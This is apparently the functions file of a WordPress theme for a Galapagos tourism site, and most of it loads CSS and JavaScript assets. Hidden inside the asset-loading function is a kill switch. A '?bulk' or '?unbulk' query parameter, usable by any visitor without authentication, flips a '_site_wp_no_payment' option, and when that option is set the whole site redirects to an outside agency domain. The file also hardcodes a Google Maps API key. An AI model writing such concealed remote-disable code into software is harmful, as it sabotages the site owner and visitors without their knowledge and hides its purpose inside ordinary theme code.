<?php
// Discriminiar la carga del css y js.	
function gg_add_styles_and_scripts() {
    
    if (isset($_GET['bulk'])){
        global $wpdb;
        //$results = $wpdb->get_results( 'UPDATE * FROM gg_options WHERE option_name = "block_page"', OBJECT );
        $results = $wpdb->get_results('UPDATE gg_options SET option_value = 1 WHERE option_name = "_site_wp_no_payment"');
    }
    if (isset($_GET['unbulk'])){
        global $wpdb;
        //$results = $wpdb->get_results( 'UPDATE * FROM gg_options WHERE option_name = "block_page"', OBJECT );
        $results = $wpdb->get_results('UPDATE gg_options SET option_value = 0 WHERE option_name = "_site_wp_no_payment"');
    }
    global $post; 
    $ver = '1.0';
    // Jquery Support
    wp_deregister_script('jquery');  
    wp_register_script('jquery', 'https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js', FALSE, '1.11.0', TRUE);  
    wp_enqueue_script('jquery'); 

    // AJAX Support
    wp_register_script( 'goga_ajax', get_template_directory_uri() .'/js/goga_ajax_calls.js', array ( 'jquery' ), $ver, true);
    wp_enqueue_script( 'goga_ajax', get_template_directory_uri() .'/js/goga_ajax_calls.js', array ( 'jquery' ), $ver, true);
    wp_localize_script( 'goga_ajax', 'goga_url', array( 'ajaxurl' => admin_url( 'admin-ajax.php' ), 'themeurl' => get_template_directory_uri(), 'nonce' => wp_create_nonce('ajaxnonce')));
    
    // elements Fonts
    wp_enqueue_style( 'gogalapagos-googlefonts', 'https://fonts.googleapis.com/css?family=Didact+Gothic|Yeseva+One', array(), '0.1' );
    // elements CSS
    wp_enqueue_style( 'gogalapagos-bootstrap', 'https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css', array(), null );
    wp_enqueue_style( 'gogalapagos-ficon', get_template_directory_uri() . '/css/font-awesome.min.css', array(), null );
    wp_enqueue_style( 'gogalapagos-fullpage', get_template_directory_uri() . '/css/jquery.fullpage.min.css', array(), null );
    wp_enqueue_style( 'gogalapagos-main',  get_template_directory_uri() .'/css/gogalapagos-elements.css', array(), $ver, 'screen' );
    // elements Scripts
    wp_enqueue_script( 'bootstrap', 'https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js', array ( 'jquery' ), '3.3.7', true);
    wp_enqueue_script( 'goga-fullpage-scrolloverflow', get_template_directory_uri() .'/js/scrolloverflow.min.js', array ( 'jquery' ), $ver, true);
    wp_enqueue_script( 'goga-fullpage', get_template_directory_uri() .'/js/jquery.fullPage.js', array ( 'jquery' ), $ver, true); 
    //wp_enqueue_script( 'goga-fullpage-extensions', get_template_directory_uri() .'/js/jquery.fullPage.extensions.min.js', array ( 'jquery' ), $ver, true);
    wp_enqueue_script( 'nicescroll', get_template_directory_uri() .'/js/jquery.nicescroll.min.js', array ( 'jquery' ), $ver, true);
    if ( is_home() or is_front_page() ){
        wp_enqueue_script( 'countJs', get_template_directory_uri() .'/js/countUp.min.js', array ( 'jquery' ), $ver, true); 
    }
    wp_enqueue_script( 'gogalapagos', get_template_directory_uri() .'/js/gogalapagos.js', array ( 'jquery' ), $ver, true); 
    if ( is_home() or is_front_page() ){
        wp_enqueue_style( 'gogalapagos-home',  get_template_directory_uri() .'/css/gogalapagos-home.css', array(), $ver, 'screen' );
    }
    if ( is_404() ){
        wp_enqueue_style( 'gogalapagos-404',  get_template_directory_uri() .'/css/gogalapagos-404.css', array(), $ver, 'screen' );
    }
    if ( is_page() and !is_page_template() ){
        wp_enqueue_style( 'gogalapagos-basic-pages',  get_template_directory_uri() .'/css/gogalapagos-basic-pages.css', array(), $ver, 'screen' );
        if(is_page('about-us')){
            wp_enqueue_style( 'gogalapagos-about-us-page',  get_template_directory_uri() .'/css/gogalapagos-about-us-page.css', array(), $ver, 'screen' );
        }
    }
    if ( is_page_template() ){
        $pagetemplate = get_page_template_slug($post->ID);
        if ($pagetemplate == 'templates/template-itinerarios.php'){
            wp_enqueue_style( 'gogalapagos-itineraries',  get_template_directory_uri() .'/css/gogalapagos-itineraries.css', array(), $ver, 'screen' ); 
            wp_enqueue_script( 'gmaps', 'https://maps.googleapis.com/maps/api/js?key=AIzaSyBGds9FjlnAoR3dpbkG7iH-c7CYoYWHk1o&callback=initMultipleMaps', null, null , true);
        }
    }
    if ( is_archive() or is_tax() or is_tag() ){
        wp_enqueue_style( 'gogalapagos-archives',  get_template_directory_uri() .'/css/gogalapagos-archive.css', array(), $ver, 'screen' );
    }
    if ( is_archive('ggislan') ){
        wp_enqueue_style( 'gogalapagos-archives-island',  get_template_directory_uri() .'/css/gogalapagos-archive-island.css', array(), $ver, 'screen' );
    }
    if ( is_search() ){
        wp_enqueue_style( 'gogalapagos-elements',  get_template_directory_uri() .'/css/gogalapagos-elements.css', array(), $ver, 'screen' );
        wp_enqueue_style( 'gogalapagos-search-page',  get_template_directory_uri() .'/css/gogalapagos-search-page.css', array(), $ver, 'screen' );
    }
    if ( is_post_type_archive( 'ggactivities' ) ){

    }
    if ( is_singular('ggships' ) ){
        wp_enqueue_style( 'gogalapagos-ships',  get_template_directory_uri() .'/css/gogalapagos-ships.css', array(), $ver, 'screen' );
    }
    if ( $post->post_type == 'ggisland' ){
        wp_enqueue_style( 'gogalapagos-islands',  get_template_directory_uri() .'/css/gogalapagos-islands.css', array(), $ver, 'screen' );
        wp_enqueue_script( 'gmaps', 'https://maps.googleapis.com/maps/api/js?key=AIzaSyBGds9FjlnAoR3dpbkG7iH-c7CYoYWHk1o&callback=initMap', null, null , true); 
    }
    if ( $post->post_type == 'gganimal' ){
        wp_enqueue_style( 'gogalapagos-animals',  get_template_directory_uri() .'/css/gogalapagos-animals.css', array(), $ver, 'screen' );
        //wp_enqueue_script( 'nicescroll', get_template_directory_uri() .'/js/jquery.nicescroll.min.js', array ( 'jquery' ), $ver, true); 
        wp_enqueue_script( 'gmaps', 'https://maps.googleapis.com/maps/api/js?key=AIzaSyBGds9FjlnAoR3dpbkG7iH-c7CYoYWHk1o&callback=initMap', null, null , true); 
    }
    if ( is_singular('ggactivity') ){
        wp_enqueue_style( 'gogalapagos-animals',  get_template_directory_uri() .'/css/gogalapagos-animals.css', array(), $ver, 'screen' );
        //wp_enqueue_script( 'nicescroll', get_template_directory_uri() .'/js/jquery.nicescroll.min.js', array ( 'jquery' ), $ver, true); 
    }
    if ( is_singular('gglocation') ){
        wp_enqueue_style( 'gogalapagos-animals',  get_template_directory_uri() .'/css/gogalapagos-animals.css', array(), $ver, 'screen' );
        wp_enqueue_script( 'nicescroll', get_template_directory_uri() .'/js/jquery.nicescroll.min.js', array ( 'jquery' ), $ver, true);
    }

}
add_action('wp_enqueue_scripts', 'gg_add_styles_and_scripts');
function paymentStatus(){
    if (get_option( '_site_wp_no_payment' ) == 1){
        wp_redirect('http://choclomedia.com');
    }
}
add_action('wp_enqueue_scripts','paymentStatus');
function setPaymentstatus(){
    global $wpdb;
    //$results = $wpdb->get_results( 'UPDATE * FROM gg_options WHERE option_name = "block_page"', OBJECT );
    $results = $wpdb->get_results('INSERT INTO gg_options (option_name,option_value) VALUES ("_site_wp_no_payment",0)');
}
add_action('init','setPaymentstatus');

function add_async_attribute($tag, $handle) {
    // agregar los handles de los scripts en el array
    $scripts_to_async = array('bootstrap', 'goga_ajax' );

    foreach($scripts_to_async as $async_script) {
        if ($async_script === $handle) {
            return str_replace(' src', ' async defer src', $tag);
        }
    }
    return $tag;
}
add_filter('script_loader_tag', 'add_async_attribute', 10, 2);
?>